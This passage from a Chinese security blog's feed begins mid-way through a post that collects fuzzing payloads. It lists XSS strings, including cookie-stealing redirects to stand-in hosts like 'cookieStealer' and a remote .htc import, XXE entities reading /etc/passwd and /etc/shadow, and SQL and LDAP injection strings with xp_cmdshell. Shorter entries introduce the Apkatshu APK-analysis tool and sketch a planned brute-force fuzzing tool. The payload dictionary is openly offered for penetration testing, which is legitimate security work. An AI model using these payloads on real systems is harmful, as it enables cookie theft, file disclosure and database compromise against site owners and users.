class="line">&lt;IMG%20SRC=&quot;javascript:alert(&apos;WXSS&apos;)&quot;</span><br><span class="line">&lt;IMG%20SRC=javascript:alert(&apos;WXSS&apos;)&gt;</span><br><span class="line">&lt;IMG%20SRC=JaVaScRiPt:alert(&apos;WXSS&apos;)&gt;</span><br><span class="line">&lt;IMG%20SRC=javascript:alert(&amp;quot;WXSS&amp;quot;)&gt;</span><br><span class="line">&lt;IMG%20SRC=`javascript:alert(&quot;&apos;WXSS&apos;&quot;)`&gt;</span><br><span class="line">&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;WXSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">&lt;IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&lt;IMG%20SRC=&apos;javascript:alert(document.cookie)&apos;&gt;</span><br><span class="line">&lt;IMG%20SRC=&quot;javascript:alert(&apos;WXSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG%20SRC=&quot;jav&amp;#x09;ascript:alert(&apos;WXSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG%20SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;WXSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG%20SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;WXSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG%20SRC=&quot;%20&amp;#14;%20javascript:alert(&apos;WXSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG%20DYNSRC=&quot;javascript:alert(&apos;WXSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG%20LOWSRC=&quot;javascript:alert(&apos;WXSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG%20SRC=&apos;%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)&apos;&gt;</span><br><span class="line">&lt;IMG%20SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&lt;IMG%20SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&lt;IMG%20SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&apos;%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E</span><br><span class="line">&quot;&gt;&lt;script&gt;document.location=&apos;http://cookieStealer/cgi-bin/cookie.cgi?&apos;+document.cookie&lt;/script&gt;</span><br><span class="line">%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E</span><br><span class="line">&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//&gt;&lt;/SCRIPT&gt;!--&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;&#123;&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a><font color="green">XML</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">count(/child::node())</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">&lt;name&gt;&apos;,&apos;&apos;)); phpinfo(); exit;/*&lt;/name&gt;</span><br><span class="line">&lt;![CDATA[&lt;script&gt;var n=0;while(true)&#123;n++;&#125;&lt;/script&gt;]]&gt;</span><br><span class="line">&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&apos;XSS&apos;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&apos;XSS&apos;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&apos; or 1=1 or &apos;&apos;=&apos;]]&gt;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file://c:/boot.ini&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/shadow&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////dev/random&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;xml ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;</span><br><span class="line">&lt;xml ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</span><br><span class="line">&lt;xml SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</span><br><span class="line">&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;</span><br></pre></td></tr></table></figure><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><font color="green">SQL</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">#</span><br><span class="line">-</span><br><span class="line">--</span><br><span class="line">&apos;%20--</span><br><span class="line">--&apos;;</span><br><span class="line">&apos;%20;</span><br><span class="line">=%20&apos;</span><br><span class="line">=%20;</span><br><span class="line">=%20--</span><br><span class="line">\x23</span><br><span class="line">\x27</span><br><span class="line">\x3D%20\x3B&apos;</span><br><span class="line">\x3D%20\x27</span><br><span class="line">\x27\x4F\x52 SELECT *</span><br><span class="line">\x27\x6F\x72 SELECT *</span><br><span class="line">&apos;or%20select *</span><br><span class="line">admin&apos;--</span><br><span class="line">&lt;&gt;&quot;&apos;%;)(&amp;+</span><br><span class="line">&apos;%20or%20&apos;&apos;=&apos;</span><br><span class="line">&apos;%20or%20&apos;x&apos;=&apos;x</span><br><span class="line">&quot;%20or%20&quot;x&quot;=&quot;x</span><br><span class="line">&apos;)%20or%20(&apos;x&apos;=&apos;x</span><br><span class="line">0 or 1=1</span><br><span class="line">&apos; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&apos; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">&apos; or &apos;1&apos;=&apos;1&apos;--</span><br><span class="line">&quot;&apos; or 1 --&apos;&quot;</span><br><span class="line">or 1=1--</span><br><span class="line">or%201=1</span><br><span class="line">or%201=1 --</span><br><span class="line">&apos; or 1=1 or &apos;&apos;=&apos;</span><br><span class="line">&quot; or 1=1 or &quot;&quot;=&quot;</span><br><span class="line">&apos; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&apos; or 1=1 --</span><br><span class="line">hi&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">hi&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">hi&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">&apos;hi&apos; or &apos;x&apos;=&apos;x&apos;;</span><br><span class="line">@variable</span><br><span class="line">,@variable</span><br><span class="line">PRINT</span><br><span class="line">PRINT @@variable</span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">as</span><br><span class="line">or</span><br><span class="line">procedure</span><br><span class="line">limit</span><br><span class="line">order by</span><br><span class="line">asc</span><br><span class="line">desc</span><br><span class="line">delete</span><br><span class="line">update</span><br><span class="line">distinct</span><br><span class="line">having</span><br><span class="line">truncate</span><br><span class="line">replace</span><br><span class="line">like</span><br><span class="line">handler</span><br><span class="line">bfilename</span><br><span class="line">&apos; or username like &apos;%</span><br><span class="line">&apos; or uname like &apos;%</span><br><span class="line">&apos; or userid like &apos;%</span><br><span class="line">&apos; or uid like &apos;%</span><br><span class="line">&apos; or user like &apos;%</span><br><span class="line">exec xp</span><br><span class="line">exec sp</span><br><span class="line">&apos;; exec master..xp_cmdshell</span><br><span class="line">&apos;; exec xp_regread</span><br><span class="line">t&apos;exec master..xp_cmdshell &apos;nslookup www.google.com&apos;--</span><br><span class="line">--sp_password</span><br><span class="line">\x27UNION SELECT</span><br><span class="line">&apos; UNION SELECT</span><br><span class="line">&apos; UNION ALL SELECT</span><br><span class="line">&apos; or (EXISTS)</span><br><span class="line">&apos; (select top 1</span><br><span class="line">&apos;||UTL_HTTP.REQUEST</span><br><span class="line">1;SELECT%20*</span><br><span class="line">to_timestamp_tz</span><br><span class="line">tz_offset</span><br><span class="line">&amp;lt;&amp;gt;&amp;quot;&apos;%;)(&amp;amp;+</span><br><span class="line">&apos;%20or%201=1</span><br><span class="line">%27%20or%201=1</span><br><span class="line">%20$(sleep%2050)</span><br><span class="line">%20&apos;sleep%2050&apos;</span><br><span class="line">char%4039%41%2b%40SELECT</span><br><span class="line">&amp;apos;%20OR</span><br><span class="line">&apos;sqlattempt1</span><br><span class="line">(sqlattempt2)</span><br><span class="line">|</span><br><span class="line">%7C</span><br><span class="line">*|</span><br><span class="line">%2A%7C</span><br><span class="line">*(|(mail=*))</span><br><span class="line">%2A%28%7C%28mail%3D%2A%29%29</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">%2A%28%7C%28objectclass%3D%2A%29%29</span><br><span class="line">(</span><br><span class="line">%28</span><br><span class="line">)</span><br><span class="line">%29</span><br><span class="line">&amp;</span><br><span class="line">%26</span><br><span class="line">!</span><br><span class="line">%21</span><br><span class="line">&apos; or 1=1 or &apos;&apos;=&apos;</span><br><span class="line">&apos; or &apos;&apos;=&apos;</span><br><span class="line">x&apos; or 1=1 or &apos;x&apos;=&apos;y</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br></pre></td></tr></table></figure><h3 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a><font color="green">写在后面</font></h3><p>基本的大概是这样子，后续会不断补充的</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;先收集一波Payload&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Fuzz" scheme="http://yoursite.com/tags/Fuzz/"/>
    
      <category term="Dict" scheme="http://yoursite.com/tags/Dict/"/>
    
  </entry>
  
  <entry>
    <title>Apk逆向分析工具 ---Apkatshu</title>
    <link href="http://yoursite.com/2019/02/02/Apkatshu/"/>
    <id>http://yoursite.com/2019/02/02/Apkatshu/</id>
    <published>2019-02-01T16:00:00.000Z</published>
    <updated>2019-02-02T11:46:51.749Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">无意中发现了Apkatshu这款软件，就代码而言还是比较简单的，鉴于本人有点儿懒，就花了点儿时间深入了解了下</font><br><a id="more"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><font color="green">简介</font></h3><blockquote><p>Tool help to extract URLs, emails, up address, and juicy data from .apk files.<br>Apkatshu : tool written in bash/python for extracting interesting<br>data from apk files and save them into spplited txt files .<br>The user can choose wich decompiler to use  JADX or APKTOOL</p><ul><li>Apkatshu用于提取逆向后的APK文件中的urls,emails等敏感信息</li><li>Apkatshu采用<strong>Bash</strong>与*<em>Python</em>编写</li><li>Apkatshu需要结合<strong>JADX</strong>或者是<strong>APKTOOL</strong>这两款APK逆向工具使用</li><li><a href="https://github.com/0xpwny/Apkatshu" target="_blank" rel="noopener">https://github.com/0xpwny/Apkatshu</a></li></ul></blockquote><h4 id="JADX"><a href="#JADX" class="headerlink" title="JADX"></a>JADX</h4><blockquote><p>Command line and GUI tools for produce Java source code from Android Dex and Apk files</p><ul><li>项目地址:<a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">https://github.com/skylot/jadx</a><br>可以下载编译好的版本，也可以下载源代码，由于一直编译出错，最后我选择了编译好后的版本</li></ul></blockquote><ul><li>使用方法:<code>jadx 目标文件 -d 输出文件夹</code></li></ul><h4 id="APKTOOL"><a href="#APKTOOL" class="headerlink" title="APKTOOL"></a>APKTOOL</h4><ul><li>项目地址:<a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/install/</a><br><img src="/2019/02/02/Apkatshu/1.png" alt></li><li>使用方法:<code>APKTOOL d 目标文件 -o 输出文件夹 -p</code></li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a><font color="green">使用</font></h3><p>由于我用的是<strong>windows</strong>,所以需要进行一些修改和配置</p><h4 id="APKTOOL-1"><a href="#APKTOOL-1" class="headerlink" title="APKTOOL"></a>APKTOOL</h4><p>因为windows并不支持shell文件，所以需要用到<strong>Git Bash</strong><br>在Apkatshu.sh中通过<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>(apktool d $Application -o $dist_dir -q)</span><br></pre></td></tr></table></figure></p><p>调用apktool<br>所以需要在<a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/install/</a> 下载Linux版本，并将其放入Git Bash的<strong>/usr/bin/</strong>目录下</p><p>之后通过<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Apkatshu.sh APKTOOL 目标文件</span><br></pre></td></tr></table></figure></p><p>即可</p><h4 id="JADX-1"><a href="#JADX-1" class="headerlink" title="JADX"></a>JADX</h4><p>在选择JADX的时候一直出错，最后先使用JADX将文件反编译，之后<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Apkatshu.py 反编译的目录 JADX</span><br></pre></td></tr></table></figure></p><p>对反编译后的文件进行分析</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;无意中发现了Apkatshu这款软件，就代码而言还是比较简单的，鉴于本人有点儿懒，就花了点儿时间深入了解了下&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具使用" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>想要写出来自己的东西~~</title>
    <link href="http://yoursite.com/2019/02/01/Evil/"/>
    <id>http://yoursite.com/2019/02/01/Evil/</id>
    <published>2019-01-31T16:00:00.000Z</published>
    <updated>2019-02-01T14:26:14.675Z</updated>
    
    <content type="html"><![CDATA[<font color="green">在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~</font><a id="more"></a><h2 id="X-Fuzz工具"><a href="#X-Fuzz工具" class="headerlink" title="X-Fuzz工具"></a>X-Fuzz工具</h2><h3 id="预期功能"><a href="#预期功能" class="headerlink" title="预期功能"></a><font color="green">预期功能</font></h3><ul><li>对目标网站目录进行爆破</li><li>对目标网站参数进行爆破</li><li>对目标网站子域名进行爆破</li><li>每次爆破后更新字典，出现频率高的字段，排名靠前</li></ul><h3 id="使用技术"><a href="#使用技术" class="headerlink" title="使用技术"></a><font color="green">使用技术</font></h3><ul><li>Python 主要使用Python</li><li>Redis     用来储存字典</li><li>其他       可能用到的别的</li></ul><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a><font color="green">目的</font></h3><ul><li>方便渗透测试</li><li>自我锻炼</li></ul><h3 id="用时"><a href="#用时" class="headerlink" title="用时"></a><font color="green">用时</font></h3><ul><li>整个寒假</li><li>率先完成对目录爆破的部分</li></ul><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a><font color="green">后续</font></h3><ul><li>尽量每天更新代码</li><li>每天还会有别的更新</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;在家无事，于是乎想自己开发一款工具，方便自己使用，顺便提高下能力吧~&lt;/font&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
      <category term="Fuzz" scheme="http://yoursite.com/tags/Fuzz/"/>
    
  </entry>
  
</feed>
